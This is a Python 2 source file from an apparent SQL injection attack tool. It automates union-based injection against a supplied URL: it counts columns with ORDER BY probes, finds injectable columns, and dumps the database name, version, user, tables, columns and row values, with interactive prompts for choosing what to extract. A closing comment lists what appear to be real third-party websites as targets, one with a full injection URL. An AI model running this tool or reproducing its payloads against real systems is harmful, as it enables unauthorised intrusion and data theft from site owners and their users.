#this file created for union base attck method
# -*- coding: utf-8 -*-
try:
    import src.libs as lib
    from src.Colors import TextColor
    from injection_defines import *

    from Config.WebConfig import (define_headerdata)
except Exception as err:
    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s" % (err)) \
                      + TextColor.WHITE

class test_UnionBaseAttack(object):
    def __init__(self, url, injectedChar, firstResponse):
        self.url = url
        self.injectedChar = injectedChar
        self.firstResponse = firstResponse

        self.__StartAttack__()

    def __StartAttack__(self):
        global columns
        injected_method = ""
        orderby_Bypass = False

        #order by injection with error
        for item in define_order_by_command_php:
            lib.sleep(.5)
            secondResponse = lib.requests.get(url=self.url + str(item),
                                              headers=define_headerdata, verify=False)
            if secondResponse.content.find(define_error_order_by_php[0]) is not -1 or \
                    secondResponse.content != self.firstResponse.content:
                injected_method = item[0:10]
                print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
                columns = self.__InjectOrderNumber__(injected_method)
                done_str = self.url + injected_method + str(columns)
                if columns == 1 or columns == 0:
                    orderby_Bypass = True 
                    break
                print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, done_str)) + TextColor.WHITE
                print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
                self.__UnionSelectQuery__(columns)
                del (columns)
                del (injected_method)
                break
            else:
                orderby_Bypass = True

        if orderby_Bypass == True:

            quote_bypass = False

            print TextColor.CVIOLET + str('\nPlease wait we must bypass order by injection') + TextColor.WHITE

            secondResponse = lib.requests.get(url=self.url + " order by 1000 --+",
                                              headers=define_headerdata, verify=False)
            # if secondResponse.content == self.firstResponse.content:
            #     quote_bypass = True

            #order by injection with bypass %23 todo=something is wrong please check above http site to fix this below codes
            for item in define_order_by_command_php:


                if quote_bypass == False:
                    for counter in xrange(1, 1000):
                        lib.sleep(.5)
                        secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --+"%(counter),
                                                          headers=define_headerdata, verify=False)
                        if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1 or \
                                secondResponse.content != self.firstResponse.content:
                            done_str = self.url + item[0:10] + str(counter - 1)
                            print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
                            print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
                            self.__UnionSelectQuery__(counter - 1)
                            del columns
                            break
                else:
                    for counter in xrange(1, 1000):
                        lib.sleep(.5)
                        secondResponse = lib.requests.get(url=self.url + "\'" + item[0:10] + "%d --+"%(counter),
                                                          headers=define_headerdata, verify=False)
                        for error in define_error_order_by_php:
                            if secondResponse.content.find(error) is not -1 or \
                                    secondResponse.content != self.firstResponse.content:
                                done_str = self.url + item[0:10] + str(counter - 1)
                                print TextColor.CBEIGE + str(
                                    "[+] Found => %d columns {%s}" % (counter - 1, done_str)) + TextColor.WHITE
                                print TextColor.CVIOLET + str(
                                    "\nNow I testing the union select query ...") + TextColor.WHITE
                                self.__UnionSelectQuery__(counter - 1)
                                del columns
                                break

        

    def __InjectOrderNumber__ (self, injectedMethod):
        '''return count of columns that website has'''
        for counter in xrange(1, 1000):
            lib.sleep(1)
            secondResponse = lib.requests.get(url=self.url + injectedMethod + str(counter), verify=False)
            if secondResponse.content != self.firstResponse.content:
                return counter - 1

    def __UnionSelectQuery__(self, columns):
        list_my_injection_numbers = list()
        for number in xrange(1, columns + 1):
            list_my_injection_numbers.append(str(number) * 10)
        
        injection_string = ""

        for counter in list_my_injection_numbers:
            injection_string = injection_string + str(counter) + ","

        injection_string = injection_string[0:len(injection_string) - 1]

        id_number = lib.re.findall('\d', self.url)
        new_url = lib.string.replace(self.url, id_number[0], '-' + id_number[0])

        vuln_columns = list()
        done_searching_columns = False
        success_InjectedString = ""
        raw_vuln_columns = list()
        
        '''this below code test url with (-) in and forward of number in url'''
        for item in define_union_select_query_php:    
            response = lib.requests.get(url=new_url + str(item + injection_string),
                                        headers=define_headerdata, verify=False)
            for numbers in list_my_injection_numbers:
                if response.content.find(numbers) is not -1:
                    vuln_columns.append(numbers[0:1])
                    raw_vuln_columns.append(numbers)
                    done_searching_columns = True
            lib.sleep(0.5)
            if done_searching_columns == True:
                success_InjectedString = new_url + str(item + injection_string)
                break
        
        '''this below code test raw url with no (-) in url'''
        if done_searching_columns == False:
            for item in define_union_select_query_php:    
                response = lib.requests.get(url=self.url + str(item + injection_string),
                                            headers=define_headerdata,
                                            verify=False)
                for numbers in list_my_injection_numbers:
                    if response.content.find(numbers) is not -1:
                        vuln_columns.append(numbers[0:1])
                        raw_vuln_columns.append(numbers)
                        done_searching_columns = True
                lib.sleep(0.5)
                if done_searching_columns == True:
                    success_InjectedString = new_url + str(item + injection_string)
                    break

        print TextColor.CYELLOWBG + TextColor.RED + "[+] Found Vulnarable columns number " + TextColor.WHITE
        
        str_vulns_columns = ""
        for item in vuln_columns:
            str_vulns_columns = str_vulns_columns + item + " "
        str_vulns_columns = str_vulns_columns[0:len(str_vulns_columns) - 1]        

        lib.sys.stdout.write("Vulnarable Columns =>\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
        lib.sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")

        self.__ExtractData__(raw_vuln_columns, success_InjectedString)

        del(list_my_injection_numbers)
        del(raw_vuln_columns)
        del(success_InjectedString)

    def __ExtractData__(self, vuln_columns, success_InjectedString):
        '''
            this function work on data in database and extract them with sql query injection
        '''
        #we pick this two variables for writting results to file
        database_name = ""
        version_name = ""

        #----------------------------------------------Database extracting--------------------------------------------
        for item in define_database_detection_query_php:
            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
                                        headers=define_headerdata, verify=False)
            if response.content.find("'2134115356'") is not -1:
                end = lib.re.search("'2134115356'", response.content).end()
                starts = lib.re.search("'62134115356'", response.content).start()
                print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
                database_name = response.content[end:starts]
            lib.sleep(.5)
        lib.sleep(.5)
        
        #------------------------------------------------------End of Database extracting-----------------------------------------------------
        #-----------------------------------------------Version extracting---------------------------------------------------
        for item in define_version_detection_query_php:
            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
                                        headers=define_headerdata, verify=False)
            if response.content.find("'2134115356'") is not -1:
                end = lib.re.search("'2134115356'", response.content).end()
                starts = lib.re.search("'62134115356'", response.content).start()
                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:starts] + TextColor.WHITE
                database_name = response.content[end:starts]
            lib.sleep(.5)
        lib.sleep(.5)
        #----------------------------------------------End of version extracting-------------------------------------------------
        #---------------------------------------------------------Extract User of database-------------------------------------------------
        for item in define_user_detection_query_php:
            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
                                        headers=define_headerdata, verify=False)
            if response.content.find("'2134115356'") is not -1:
                end = lib.re.search("'2134115356'", response.content).end()
                starts = lib.re.search("'62134115356'", response.content).start()
                print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:starts] + TextColor.WHITE
                database_name = response.content[end:starts]
            lib.sleep(.5)
        lib.sleep(.5)
        
        #---------------------------------------------------------End of Extract User of database-------------------------------------------------
        #------------------------------------------StarTing Extracting tables of DataBaseS--------------------------------------------
        #4.1 extract the tables of database
        tables_name = ""
        need_convert_query = False
        for counter in xrange(0, len(define_get_tables_name_query_php)):
            response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                        vuln_columns[0], define_get_tables_name_query_php[counter])
                        + define_end_string_group_concat_query_php[counter]),  headers=define_headerdata, verify=False)

            if response.content.find("'2134115356'") is not -1:
                try:
                    end = lib.re.search("'2134115356'", response.content).end()
                    start = lib.re.search("'62134115356'", response.content).start()
                    print TextColor.CBEIGE2 + str("[+]Tables of database is => ") + TextColor.WHITE
                    tables_name = response.content[end:start].split(',')
                    break
                except:
                    need_convert_query = True
                    break

            lib.sleep(.5)

        #4.2 extract the tables of database with convert
        if need_convert_query == True:
            tables_name = list()
            limit_counter = 0
            counter = 0
            print TextColor.ENDC + "Please wait to get all table name ..."
            while True:
                response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                            vuln_columns[0], define_convert_query_php[counter])
                            + define_end_convert_query_php[counter] + "%d, 1"%(limit_counter)),
                                            headers=define_headerdata, verify=False)

                if response.content.find("'2134115356'") is not -1:
                    try:
                        end = lib.re.search("'2134115356'", response.content).end()
                        start = lib.re.search("'62134115356'", response.content).start()
                        tables_name.append(response.content[end:start])
                        limit_counter = limit_counter + 1
                    except:
                        break
                else:
                    break
                lib.sleep(.5)

        counter = 0
        make_table = lib.mytable(['Count', 'Name'])
        for item in tables_name:
            make_table.add_row([str(counter), item])
            counter = counter + 1

        print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

        column_exttracted = ""
        while True:
            table_num = raw_input(TextColor.CBLUE + "~#/Enter table that you want extract([enter exit to return]):" + TextColor.WHITE)
            if table_num == "exit":
                break
            print

            #5. extract column in table_name
            need_convert_query = False
            selected_table = tables_name[int(table_num)]
            for counter in xrange(0, len(define_get_columns_of_table_query_php)):
                response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                            vuln_columns[0], define_get_columns_of_table_query_php[counter])
                            + define_end_string_columns_of_table_query_php[counter] + "%27" + selected_table + "%27"),
                                            headers=define_headerdata, verify=False)
                if response.content.find("'2134115356'") is not -1:
                    try:
                        end = lib.re.search("'2134115356'", response.content).end()
                        start = lib.re.search("'62134115356'", response.content).start()
                        print TextColor.CBEIGE2 + str("[+]Column of %s is => "%(selected_table)) + TextColor.WHITE
                        column_exttracted = response.content[end:start].split(',')
                    except: 
                        need_convert_query = True
                        break
                lib.sleep(.5)

            #5.2 extract column in table_name with convert query
            if need_convert_query == True:
                column_exttracted = list()
                limit_counter = 0
                counter = 0
                print TextColor.ENDC + "Please wait to get all column name in table %s ..."%(selected_table)
                while True:
                    response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                                vuln_columns[0], define_get_columns_of_table_convert_query_php[counter])
                                + define_end_columns_of_table_convert_query_php[counter] + "" + selected_table + ""
                                + " limit %d, 1"%(limit_counter)),  headers=define_headerdata, verify=False)
                    if response.content.find("'2134115356'") is not -1:
                        try:
                            end = lib.re.search("'2134115356'", response.content).end()
                            start = lib.re.search("'62134115356'", response.content).start()
                            column_exttracted.append(response.content[end:start])
                            limit_counter = limit_counter + 1
                        except:
                            break
                    else:
                        break
                    lib.sleep(.5)
            
            print 

            counter = 0
            make_table = lib.mytable(['Count', 'Name'])
            for item in column_exttracted:
                make_table.add_row([str(counter), item])
                counter = counter + 1
            print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

            #todo = write convert for this stage
            #check this error 'utf8' codec can't decode byte 0xf3 in position 15: invalid continuation byte
            while True: #extract columns data after extracted table
                column_num = raw_input(TextColor.CBLUE + "~#/Enter column number that you want extract([enter exit to return]):" + TextColor.WHITE)
                if column_num == "exit":
                    break
                print

                datas = ""
                selected_column = column_exttracted[int(column_num)]
                for counter in xrange(0, len(define_get_data_of_column_query_php)):

                    exchange = lib.string.replace(define_get_data_of_column_query_php[counter], "xcolumn", selected_column)

                    response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                                vuln_columns[0], exchange)
                                + " FrOm " + selected_table),  headers=define_headerdata, verify=False)
                    if response.content.find("'2134115356'") is not -1:
                        end = lib.re.search("'2134115356'", response.content).end()
                        start = lib.re.search("'62134115356'", response.content).start()
                        print TextColor.CBEIGE2 + str("[+]Data of %s is => "%(selected_column)) + TextColor.WHITE
                        datas = response.content[end:start].split(',')
                        break
                    lib.sleep(.5)
                print 

                counter = 0
                make_table = lib.mytable(['Count', 'Value'])
                for item in datas:
                    make_table.add_row([str(counter), item])
                    counter = counter + 1
                print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"



'''
    todo: http://www.atmarine.fi/index.php?id=-2%20union%20select%201,2,concat(%27hello%27,%20version(),%20%27hello%27),4,5,6,7,8,9,10
    same problem in this two target
    
    https://www.maine-elderlaw.com/article.php?id=4
    http://bcactivityreporter.com/article.php?ID=2

'''